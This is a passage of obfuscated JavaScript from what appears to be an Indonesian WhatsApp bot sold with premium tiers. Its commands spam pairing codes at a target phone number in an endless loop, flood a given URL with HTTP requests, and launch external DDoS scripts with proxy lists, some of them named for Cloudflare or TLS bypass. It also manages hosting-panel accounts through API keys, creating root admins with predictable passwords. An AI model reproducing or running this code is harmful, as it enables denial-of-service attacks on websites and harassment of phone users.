          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          await f18(v719);
          await f20(ptcp = true);
          await f18(v719);
          await sleep(1500);
          await f18(v719);
          await f18(v719);
          await f20(ptcp = true);
          await sleep(1500);
          }
        break;

      case "spampair":
        {
          if (!v697 && !v700) {
            return replyzz("Fitur ini hanya untuk pengguna Premium.");
          }
          if (!q) {
            return vF9("Contoh: " + (v626 + v642) + " 62xxxxx");
          }
          await p147.sendMessage(p148.chat, {
            react: {
              text: "✅",
              key: p148.key
            }
          });
          let v767 = q.replace(/[^0-9]/g, "").trim();
          let {
            default: _0x39e8f3,
            useMultiFileAuthState: _0x12d2ba,
            fetchLatestBaileysVersion: _0x19e857
          } = require("@whiskeysockets/baileys");
          let {
            state: _0x4f9550
          } = await _0x12d2ba("drayyy");
          let {
            version: _0xef9e0f
          } = await _0x19e857();
          let v768 = await _0x39e8f3({
            auth: _0x4f9550,
            version: _0xef9e0f,
            logger: pino2({
              level: "fatal"
            })
          });
          while (true) {
            for (let v769 = 0; v769 < 20; v769++) {
              await sleep(3000);
              try {
                let v770 = await v768.requestPairingCode(v767);
                console.log("# Succes Spam Pairing Code - Number : " + v767 + " - Code : " + v770);
                await v768.sendMessage(v767, {
                  text: "Pairing Code: " + v770
                });
              } catch (_0x20a7ba) {
                console.error("Error pada request pairing code: " + _0x20a7ba);
                if (_0x20a7ba.message.includes("Connection Closed")) {
                  console.log("Koneksi tertutup, mencoba reconnect...");
                  break;
                }
              }
            }
            await sleep(60000);
          }
        }
        break;
      case "dos":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v771 = q.split(" ")[0];
          let v772 = q.split(" ")[1] * 1000;
          if (v643.length === 2 && v771 && !isNaN(v772)) {
            let vF11 = () => {
              let v773 = 0;
              let v774 = [];
              for (let v775 = 0; v775 < 6; v775++) {
                v774.push(new Promise((p228, p229) => {
                  let vSetInterval2 = setInterval(() => {
                    for (let v776 = 0; v776 < 100; v776++) {
                      fetch(v771).then(() => {
                        v773++;
                        console.log("Attacking => " + v771 + " Total Requests: " + v773 + " Duration: " + v772);
                      }).catch(p230 => {});
                    }
                  }, 750);
                  setTimeout(() => {
                    clearInterval(vSetInterval2);
                    p228();
                  }, v772);
                }));
              }
              Promise.all(v774).then(() => console.log("Attack Complete")).catch(p231 => console.error("Error In Attack:", p231));
            };
            vF11();
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format: Dos [Url] [Time]");
          }
        }
        break;
      case "ddos":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v777 = q.split(" ")[0];
          let v778 = q.split(" ")[1];
          let v779 = q.split(" ")[2];
          let v780 = q.split(" ")[3];
          if (v643.length === 4 && v777 && v778 && v779 && v780) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + v777 + " 🎭 Serangan Berlangsung Selama " + v778 + " Detik.");
            exec("node ./ddos/hentai.js " + v777 + " " + v778 + " " + v780 + " " + v779 + " proxy.txt", (p232, p233) => {
              if (p232) {
                return console.log(p232.toString());
              }
              if (p233) {
                return console.log(util2.format(p233));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format : Ddos [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "xc":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let [v781, v782, v783, v784, v785] = q.split(" ");
          if (v643.length === 5 && v781 && v782 && v783 && v784 && v785) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju: " + v781 + " 🎭 Serangan Berlangsung Selama " + v782 + " Detik.");
            exec("node ./ddos/LC.js " + v781 + " " + v782 + " " + v783 + " " + v784 + " proxy.txt", (p234, p235) => {
              if (p234) {
                return console.log(p234.toString());
              }
              if (p235) {
                return console.log(util2.format(p235));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format: Xc [Url] [Time] [Rate] [Thread] [ProxyFile]");
          }
        }
        break;
      case "mix":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v786 = q.split(" ")[0];
          let v787 = q.split(" ")[1];
          let v788 = q.split(" ")[2];
          let v789 = q.split(" ")[3];
          if (v643.length === 4 && v786 && v787 && v788 && v789) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + v786 + " 🎭 Serangan Berlangsung Selama " + v787 + " Detik.");
            exec("node ./ddos/mix.js " + v786 + " " + v787 + " " + v788 + " " + v789, (p236, p237) => {
              if (p236) {
                return console.log(p236.toString());
              }
              if (p237) {
                return console.log(util2.format(p237));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "floods":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v790 = q.split(" ")[0];
          let v791 = q.split(" ")[1];
          let v792 = q.split(" ")[2];
          let v793 = q.split(" ")[3];
          if (v643.length === 4 && v790 && v791 && v792 && v793) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + v790 + " 🎭 Serangan Berlangsung Selama " + v791 + " Detik.");
            exec("node ./ddos/floods.js " + v790 + " " + v791 + " " + v793 + " " + v792 + " proxy.txt", (p238, p239) => {
              if (p238) {
                return console.log(p238.toString());
              }
              if (p239) {
                return console.log(util2.format(p239));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format : Floods [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "ua":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v794 = q.split(" ")[0];
          let v795 = q.split(" ")[1];
          let v796 = q.split(" ")[2];
          let v797 = q.split(" ")[3];
          if (v643.length === 4 && v794 && v795 && v796 && v797) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + v794 + " 🎭 Serangan Berlangsung Selama " + v795 + " Detik.");
            exec("node ./ddos/kilua.js " + v794 + " " + v795 + " " + v796 + " proxy.txt " + v797 + " ua.txt", (p240, p241) => {
              if (p240) {
                return console.log(p240.toString());
              }
              if (p241) {
                return console.log(util2.format(p241));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format : Ua [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "xchrome":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v798 = q.split(" ")[0];
          let v799 = q.split(" ")[1];
          let v800 = q.split(" ")[2];
          let v801 = q.split(" ")[3];
          if (v643.length === 4 && v798 && v799 && v800 && v801) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + v798 + " 🎭 Serangan Berlangsung Selama " + v799 + " Detik.");
            exec("node ./ddos/chromev3.js " + v798 + " " + v799 + " " + v801 + " " + v800 + " proxy.txt", (p242, p243) => {
              if (p242) {
                return console.log(p242.toString());
              }
              if (p243) {
                return console.log(util2.format(p243));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format Xchrome [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tls":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v802 = q.split(" ")[0];
          let v803 = q.split(" ")[1];
          let v804 = q.split(" ")[2];
          let v805 = q.split(" ")[3];
          if (v643.length === 4 && v802 && v803 && v804 && v805) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + v802 + " 🎭 Serangan Berlangsung Selama " + v803 + " Detik.");
            exec("node ./ddos/tls-arz.js " + v802 + " " + v803 + " " + v805 + " " + v804 + " proxy.txt", (p244, p245) => {
              if (p244) {
                return console.log(p244.toString());
              }
              if (p245) {
                return console.log(util2.format(p245));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format Tls [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tlsbypass":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v806 = q.split(" ")[0];
          let v807 = q.split(" ")[1];
          let v808 = q.split(" ")[2];
          let v809 = q.split(" ")[3];
          if (v643.length === 4 && v806 && v807 && v808 && v809) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + v806 + " 🎭 Serangan Berlangsung Selama " + v807 + " Detik.");
            exec("node ./ddos/tls-bypass.js " + v806 + " " + v807 + " " + v809 + " " + v808, (p246, p247) => {
              if (p246) {
                return console.log(p246.toString());
              }
              if (p247) {
                return console.log(util2.format(p247));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format Tlsbypass [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tlsv2":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v810 = q.split(" ")[0];
          let v811 = q.split(" ")[1];
          let v812 = q.split(" ")[2];
          let v813 = q.split(" ")[3];
          if (v643.length === 4 && v810 && v811 && v812 && v813) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + v810 + " 🎭 Serangan Berlangsung Selama " + v811 + " Detik.");
            exec("node ./ddos/tls.js " + v810 + " " + v811 + " " + v813 + " " + v812 + " proxy.txt", (p248, p249) => {
              if (p248) {
                return console.log(p248.toString());
              }
              if (p249) {
                return console.log(util2.format(p249));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format Tlsv2 [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "bypass-cf":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v814 = q.split(" ")[0];
          let v815 = q.split(" ")[1];
          let v816 = q.split(" ")[2];
          let v817 = q.split(" ")[3];
          if (v643.length === 4 && v814 && v815 && v816 && v817) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + v814 + " 🎭 Serangan Berlangsung Selama " + v815 + " Detik.");
            exec("node ./ddos/bypass.js " + v814 + " " + v815 + " " + v817 + " " + v816 + " proxy.txt", (p250, p251) => {
              if (p250) {
                return console.log(p250.toString());
              }
              if (p251) {
                return console.log(util2.format(p251));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format : Bypass-cf [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tls-vip":
        {
          if (!v697 && !v700) {
            return vF9(mess.only.premium);
          }
          let v818 = q.split(" ")[0];
          let v819 = q.split(" ")[1];
          let v820 = q.split(" ")[2];
          let v821 = q.split(" ")[3];
          if (v643.length === 4 && v818 && v819 && v820 && v821) {
            vF9("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + v818 + " 🎭 Serangan Berlangsung Selama " + v819 + " Detik.");
            exec("node ./ddos/tlsvip.js " + v818 + " " + v819 + " " + v821 + " " + v820 + " proxy.txt", (p252, p253) => {
              if (p252) {
                return console.log(p252.toString());
              }
              if (p253) {
                return console.log(util2.format(p253));
              }
            });
          } else {
            vF9("Format Pesan Tidak Benar. Gunakan Format Tls-vip [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "addseller":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v643[0]) {
            return vF9("Penggunaan " + (v626 + v642) + " nomor\nContoh " + (v626 + v642) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let v822 = await p147.onWhatsApp(prrkek);
          if (v822.length == 0) {
            return vF9("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          v680.push(prrkek);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(v680));
          vF9("Nomor " + prrkek + " Telah Menjadi Reseller Panel!");
        }
        break;
      case "addprem":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v643[0]) {
            return vF9("Penggunaan " + (v626 + v642) + " nomor\nContoh " + (v626 + v642) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let v823 = await p147.onWhatsApp(prrkek);
          if (v823.length == 0) {
            return vF9("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          v680.push(prrkek);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(v680));
          vF9("Nomor " + prrkek + " Telah Menjadi Premium!");
        }
        break;
      case "addmurbug":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v643[0]) {
            return vF9("Penggunaan " + (v626 + v642) + " nomor\nContoh " + (v626 + v642) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let v824 = await p147.onWhatsApp(prrkek);
          if (v824.length == 0) {
            return vF9("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          v680.push(prrkek);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(v680));
          vF9("Nomor " + prrkek + " Telah Menjadi Murbug");
        }
        break;
      case "delprem":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v643[0]) {
            return vF9("Penggunaan " + (v626 + v642) + " nomor\nContoh " + (v626 + v642) + " 628388072690");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = v680.indexOf(bro);
          v680.splice(unp, 1);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(v680));
          vF9("Nomor " + bro + " Telah Di Hapus Premium!");
        }
        break;
      case "delseller":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v643[0]) {
            return vF9("Penggunaan " + (v626 + v642) + " nomor\nContoh " + (v626 + v642) + " 628388072690");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = v680.indexOf(bro);
          v680.splice(unp, 1);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(v680));
          vF9("Nomor " + bro + " Telah Di Hapus Seller");
        }
        break;
      case "delmurbug":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v643[0]) {
            return vF9("Penggunaan " + (v626 + v642) + " nomor\nContoh " + (v626 + v642) + " 628388072690");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = v680.indexOf(bro);
          v680.splice(unp, 1);
          fs3.writeFileSync("./database/premium.json", JSON.stringify(v680));
          vF9("Nomor " + bro + " Telah Di Hapus Murbug!");
        }
        break;
      case "addown":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v643[0]) {
            return vF9("Penggunaan " + (v626 + v642) + " nomor\nContoh " + (v626 + v642) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let v825 = await p147.onWhatsApp(prrkek);
          if (v825.length == 0) {
            return vF9("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          v682.push(prrkek);
          fs3.writeFileSync("./database/owner.json", JSON.stringify(v682));
          vF9("Nomor " + prrkek + " Telah Menjadi Own Panel!");
        }
        break;
      case "delown":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v643[0]) {
            return vF9("Penggunaan " + (v626 + v642) + " nomor\nContoh " + (v626 + v642) + " 628388072690");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = v682.indexOf(bro);
          v682.splice(unp, 1);
          fs3.writeFileSync("./database/owner.json", JSON.stringify(v682));
          vF9("Nomor " + bro + " Telah Di Hapus Own Panel!");
        }
        break;
      case "addpt":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v643[0]) {
            return vF9("Penggunaan " + (v626 + v642) + " nomor\nContoh " + (v626 + v642) + " 62838072690");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let v826 = await p147.onWhatsApp(prrkek);
          if (v826.length == 0) {
            return vF9("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!");
          }
          v681.push(prrkek);
          fs3.writeFileSync("./database/partner.json", JSON.stringify(v681));
          vF9("Nomor " + prrkek + " Telah Menjadi PT Panel!");
        }
        break;
      case "delpt":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!v643[0]) {
            return vF9("Penggunaan " + (v626 + v642) + " nomor\nContoh " + (v626 + v642) + " 628388072690");
          }
          bro = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = v681.indexOf(bro);
          v681.splice(unp, 1);
          fs3.writeFileSync("./database/partner.json", JSON.stringify(v681));
          vF9("Nomor " + bro + " Telah Di Hapus PT Panel!");
        }
        break;
      case "addgcseller":
        if (!v700) {
          return;
        }
        if (!v651) {
          return vF9("kushus grup!");
        }
        if (!v700) {
          return vF9(mess.only.owner);
        }
        v683.push(p148.chat);
        fs3.writeFileSync("./database/unli.json", JSON.stringify(v683));
        vF9("Berhasil addgcseller");
        break;
      case "delgcseller":
        {
          if (!v651) {
            return vF9("kushus grup!");
          }
          if (!v700) {
            return vF9(mess.only.owner);
          }
          v683.splice(p148.chat);
          fs3.writeFileSync("./database/unli.json", JSON.stringify(v683));
          vF9("Berhasil Delgcseller");
        }
        break;
      case "addgcmurbug":
        if (!v700) {
          return;
        }
        if (!v651) {
          return vF9("kushus grup!");
        }
        if (!v700) {
          return vF9(mess.only.owner);
        }
        v683.push(p148.chat);
        fs3.writeFileSync("./database/unli.json", JSON.stringify(v683));
        vF9("Seluruh member grup kini telah menjadi murbug");
        break;
      case "delgcmurbug":
        {
          if (!v651) {
            return vF9("kushus grup!");
          }
          if (!v700) {
            return vF9(mess.only.owner);
          }
          v683.splice(p148.chat);
          fs3.writeFileSync("./database/unli.json", JSON.stringify(v683));
          vF9("Seluruh member grup sudah tidak lagi menjadi murbug");
        }
        break;
      case "ramlist":
        lrm = "RAM BANG DRAY YANG TERSEDIA :\n\n.1GB nama,62xxxx\n.2GB nama,62xxxx\n.3GB nama,62xxxx\n.4GB nama,62xxxx\n.5GB nama,62xxxx\n.6GB nama,62xxxx\n.7GB nama,62xxxx\n.8GB nama,62xxxx\n.9GB nama,62xxxx\n.10GB nama,62xxxx\n.unli nama,62xxxx\n\nSelamat Berjualan :)\n";
        p147.sendMessage(v650, {
          text: lrm
        }, {
          quoted: p148
        });
        break;
      case "panel":
        {
          const v827 = wek = "*⊷ SCRIPT BY : dray*\n*⊷ BOT NAME : dray-BOTZ*\n*⊷ PENGGUNA NAME : " + botname + "*\n*⊷ BUY SC : 628388072690*\n*⊷ BUY BOT : 628388072690*\n";
          let v828 = [{
            title: "Cara Pembuatan panel",
            highlight_label: "List Ram Panel",
            rows: [{
              title: "1gb",
              description: ".1gb user,nowa",
              id: ".1gb"
            }, {
              title: "2gb",
              description: ".2gb user,nowa",
              id: ".2gb"
            }, {
              title: "3gb",
              description: ".3gb user,nowa",
              id: ".3gb"
            }, {
              title: "4gb",
              description: ".4gb user,nowa",
              id: ".4gb"
            }, {
              title: "5gb",
              description: ".5gb user,nowa",
              id: ".5gb"
            }, {
              title: "6gb",
              description: ".6gb user,nowa",
              id: ".6gb"
            }, {
              title: "7gb",
              description: ".7gb user,nowa",
              id: ".7gb"
            }, {
              title: "8gb",
              description: ".8gb user,nowa",
              id: ".8gb"
            }, {
              title: "9gb",
              description: ".9gb user,nowa",
              id: ".9gb"
            }, {
              title: "10gb",
              description: ".10gb user,nowa",
              id: ".10gb"
            }, {
              title: "unli",
              description: ".unli user,nowa",
              id: ".unli"
            }]
          }];
          let v829 = {
            title: "Prelist Panel",
            sections: v828
          };
          let vGenerateWAMessageFromContent12 = generateWAMessageFromContent(p148.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [p148.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                      newsletterJid: "120363267533195844@newsletter",
                      newsletterName: "SC BY dray",
                      serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                      businessOwnerJid: p147.decodeJid(p147.user.id)
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: wek
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: vF7("SC CREATE PANEL BY dray✅")
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                    title: "Welcome bos",
                    subtitle: "dcdXdino",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                      video: dray
                    }, {
                      upload: p147.waUploadToServer
                    }))
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify(v829)
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Creator\",\"url\":\"https://wa.me/6289603693479\",\"merchant_url\":\"https://wa.me/6289603693479\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Subscribe\",\"url\":\"https://www.youtube.com/@drayyy1720\",\"merchant_url\":\"https://www.youtube.com/@drayyy1720\"}"
                    }]
                  })
                })
              }
            }
          }, {});
          await p147.relayMessage(vGenerateWAMessageFromContent12.key.remoteJid, vGenerateWAMessageFromContent12.message, {
            messageId: vGenerateWAMessageFromContent12.key.id
          });
        }
        break;
      case "listsrv":
        {
          if (!v700 && !v698) {
            return vF9("Maaf, Anda tidak dapat melihat daftar server cuma bang dray yang bisa.");
          }
          let v830 = v643[0] ? v643[0] : "1";
          let v831 = await fetch(domain + "/api/application/servers?page=" + v830, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let v832 = await v831.json();
          let v833 = v832.data;
          let v834 = [];
          let v835 = "Berikut adalah daftar servernya bang dray:\n\n";
          for (let v836 of v833) {
            let v837 = v836.attributes;
            let v838 = await fetch(domain + "/api/client/servers/" + v837.uuid.split`-`[0] + "/resources", {
              method: "GET",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + capikey
              }
            });
            let v839 = await v838.json();
            let v840 = v839.attributes ? v839.attributes.current_state : v837.status;
            v835 += "ID Server: " + v837.id + "\n";
            v835 += "Nama Server: " + v837.name + "\n";
            v835 += "Status: " + v840 + "\n\n";
            v835 += "BY dray";
          }
          v835 += "Halaman: " + v832.meta.pagination.current_page + "/" + v832.meta.pagination.total_pages + "\n";
          v835 += "Total Server: " + v832.meta.pagination.count;
          await p147.sendMessage(p148.chat, {
            text: v835
          }, {
            quoted: p148
          });
          if (v832.meta.pagination.current_page < v832.meta.pagination.total_pages) {
            vF9("Gunakan perintah " + v626 + "listsrv " + (v832.meta.pagination.current_page + 1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "listusr":
        {
          if (!v700 && !v698) {
            return vF9(mess.only.premium);
          }
          let v841 = v643[0] ? v643[0] : "1";
          let v842 = await fetch(domain + "/api/application/users?page=" + v841, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let v843 = await v842.json();
          let v844 = v843.data;
          let v845 = "Berikut list usernya bang dray:\n\n";
          for (let v846 of v844) {
            let v847 = v846.attributes;
            v845 += "ID: " + v847.id + " - Status: " + (v847.attributes?.user?.server_limit === null ? "Inactive" : "Active") + "\n";
            v845 += v847.username + "\n";
            v845 += v847.first_name + " " + v847.last_name + "\n\n";
            v845 += "DrayXD";
          }
          v845 += "Page: " + v843.meta.pagination.current_page + "/" + v843.meta.pagination.total_pages + "\n";
          v845 += "Total Users: " + v843.meta.pagination.count;
          await p147.sendMessage(p148.chat, {
            text: v845
          }, {
            quoted: p148
          });
          if (v843.meta.pagination.current_page < v843.meta.pagination.total_pages) {
            vF9("Gunakan perintah " + v626 + "listsrv " + (v843.meta.pagination.current_page + 1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "delsrv":
        {
          if (!v700 && !v698) {
            return vF9("KHUSUS BANG DRAY TOLOL");
          }
          let v848 = v643[0];
          if (!v848) {
            return vF9("ID nya mana?");
          }
          let v849 = await fetch(domain + "/api/application/servers/" + v848, {
            method: "DELETE",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let v850 = v849.ok ? {
            errors: null
          } : await v849.json();
          if (v850.errors) {
            return vF9("*SERVER NOT FOUND BANG DRAY*");
          }
          vF9("*SUCCESSFULLY DELETE THE SERVER BANG DRAY*");
        }
        break;
      case "delusr":
        {
          if (!v700) {
            return vF9("KHUSUS BANG DRAY TOLOL");
          }
          let v851 = v643[0];
          if (!v851) {
            return vF9("ID nya mana?");
          }
          let v852 = await fetch(domain + "/api/application/users/" + v851, {
            method: "DELETE",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let v853 = v852.ok ? {
            errors: null
          } : await v852.json();
          if (v853.errors) {
            return vF9("*USER NOT FOUND BANG DRAY*");
          }
          vF9("*SUCCESSFULLY DELETE THE USER BANG DRAY*");
        }
        break;
      case "webpanel":
        {
          const v854 = "" + domain;
          p147.sendMessage(v650, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: v854,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [v653],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: p148
          });
        }
        break;
      case "addusr":
        {
          if (!v700 && !v698) {
            return vF9("KHUSUS BANG DRAY TOLOL");
          }
          let v855 = v646.split(",");
          if (v855.length < 1) {
            return vF9("*Format salah!*\n\nPenggunaan:\n" + (v626 + v642) + " username,number/tag");
          }
          let v856 = v855[1];
          let v857 = p148.quoted ? p148.quoted.sender : v855[1] ? v855[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          if (!v857) {
            return p148.reply("*Format salah!*\n\nPenggunaan:\n" + (v626 + v642) + " username,number/tag");
          }
          let v858 = (await p147.onWhatsApp(v857.split`@`[0]))[0] || {};
          let v859 = v858.exists ? crypto2.randomBytes(5).toString("hex") : v855[3];
          let v860 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v856 + "@dray.offc",
              username: v856,
              first_name: v856,
              last_name: "Memb",
              language: "en",
              password: v859.toString()
            })
          });
          let v861 = await v860.json();
          if (v861.errors) {
            return vF9(JSON.stringify(v861.errors[0], null, 2));
          }
          let v862 = v861.attributes;
          let v863 = await p147.sendMessage(p148.chat, {
            text: "\n*SUCCESSFULLY ADD USER*\n\n  INFO USER\n*⥁**ID* : " + v862.id + "\n*⥁**USERNAME* : " + v862.username + "\n*⥁**EMAIL* : " + v862.email + "\n*⥁**NAME* : " + v862.first_name + " " + v862.last_name + "\n*⥁**CREATED AT* :  " + vF6 + "\n*⥁**PASSWORD BERHASIL DI KIRIM KE @" + v857.split`@`[0] + "*",
            mentions: [v857]
          });
          p147.sendMessage(v857, {
            text: "*BERIKUT DETAIL AKUN PANEL ANDA*\n\n  INFO USER\n*⥁**USERNAME* : " + v856 + "\n*⥁**PASSWORD* : " + v859.toString() + "\n*⥁**LOGIN* : " + domain + "\n*⥁**INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*⥁**TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n"
          });
        }
        break;
      case "cadmin":
        {
          if (!v700 && !v698) {
            return vF9("*KHUSUS BANG DRAY TOLOL*");
          }
          if (!v700) {
            return vF9(mess.owner);
          }
          let v864 = q.split(",");
          let v865 = v864[0];
          let v866 = v864[0];
          let v867 = v864[1];
          if (v864.length < 2) {
            return vF9("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          if (!v866) {
            return vF9("Ex : " + (v626 + v642) + " Username,@tag/nomor\n\nContoh :\n" + (v626 + v642) + " example,@user");
          }
          if (!v867) {
            return vF9("Ex : " + (v626 + v642) + " Username,@tag/nomor\n\nContoh :\n" + (v626 + v642) + " example,@user");
          }
          let v868 = v866 + "Dray001";
          let v869 = v867.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let v870 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v866 + "@dray.offc",
              username: v866,
              first_name: v866,
              last_name: "Memb",
              language: "en",
              root_admin: true,
              password: v868.toString()
            })
          });
          let v871 = await v870.json();
          if (v871.errors) {
            return p148.reply(JSON.stringify(v871.errors[0], null, 2));
          }
          let v872 = v871.attributes;
          let v873 = "\nTYPE: user\n\n*🗃️*ID: " + v872.id + "\n*✅*USERNAME: " + v872.username + "\n*📩*EMAIL: " + v872.email + "\n*📌*NAME: " + v872.first_name + " " + v872.last_name + "\n*🌍*LANGUAGE: " + v872.language + "\n*💻*ADMIN: " + v872.root_admin + "\n*🚬*CREATED AT: " + v872.created_at + "\n";
          const v874 = {
            text: v873
          };
          await p147.sendMessage(p148.chat, v874);
          await p147.sendMessage(v869, {
